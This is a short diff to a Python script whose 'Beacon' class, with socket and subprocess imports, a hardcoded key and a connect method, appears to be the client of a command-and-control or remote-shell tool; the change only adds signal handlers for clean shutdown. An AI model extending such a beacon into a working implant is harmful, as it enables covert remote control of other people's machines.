@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,random,platform
+import socket,subprocess,time,random,platform,signal
 
 class Beacon:
    #Contains client side behavior and state
@@ -14,6 +14,8 @@ class Beacon:
       self.debugging = True
       self.key = "chandifortnite"
       self.local_ip = self.detect_local_ip()
+      signal.signal(signal.SIGINT, self.terminate)
+      signal.signal(signal.SIGTERM, self.terminate)
 
    def connect(self):
       try:
